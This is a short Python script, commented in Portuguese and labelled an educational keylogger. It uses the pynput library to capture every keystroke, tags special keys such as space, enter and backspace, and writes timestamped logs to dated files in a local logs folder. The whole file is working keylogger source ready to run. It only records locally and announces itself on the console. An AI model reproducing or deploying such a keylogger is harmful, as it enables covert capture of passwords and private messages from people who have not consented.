from pynput import keyboard
import logging
from datetime import datetime
import os

# Diretório de log
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

log_file = f"{log_dir}/keylog_{datetime.now().strftime('%Y-%m-%d')}.txt"

logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s - %(message)s'
)

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            logging.info(" [SPACE] ")
        elif key == keyboard.Key.enter:
            logging.info(" [ENTER] ")
        elif key == keyboard.Key.tab:
            logging.info(" [TAB] ")
        elif key == keyboard.Key.backspace:
            logging.info(" [BACKSPACE] ")
        else:
            logging.info(f" [{key}] ")

def iniciar_keylogger():
    print("[+] Keylogger educacional iniciado (Ctrl+C para parar)")
    print("[!] Tudo está sendo salvo em logs/")
    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        iniciar_keylogger()
    except KeyboardInterrupt:
        print("\n[!] Keylogger parado pelo usuário.")
